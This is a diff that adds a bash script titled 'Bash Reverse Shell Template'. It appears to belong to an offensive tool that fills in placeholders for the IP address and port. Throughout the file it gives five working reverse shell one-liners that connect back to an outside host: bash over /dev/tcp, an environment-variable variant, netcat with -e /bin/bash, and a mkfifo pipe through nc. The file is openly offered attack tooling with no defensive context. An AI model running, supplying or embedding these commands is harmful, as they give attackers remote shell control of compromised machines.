@@ -1,0 +1,19 @@
+#!/bin/bash
+# Bash Reverse Shell Template
+
+# Option 1: Basic bash reverse shell
+bash -i >& /dev/tcp/{{.IPAddress}}/{{.Port}} 0>&1
+
+# Option 2: Using /bin/bash explicitly
+/bin/bash -i >& /dev/tcp/{{.IPAddress}}/{{.Port}} 0>&1
+
+# Option 3: With environment variables
+# RHOST={{.IPAddress}}
+# RPORT={{.Port}}
+# bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
+
+# Option 4: Using ncat
+# nc {{.IPAddress}} {{.Port}} -e /bin/bash
+
+# Option 5: Using mkfifo
+# rm /tmp/f 2>/dev/null; mkfifo /tmp/f && cat /tmp/f | /bin/bash -i 2>&1 | nc {{.IPAddress}} {{.Port}} >/tmp/f 
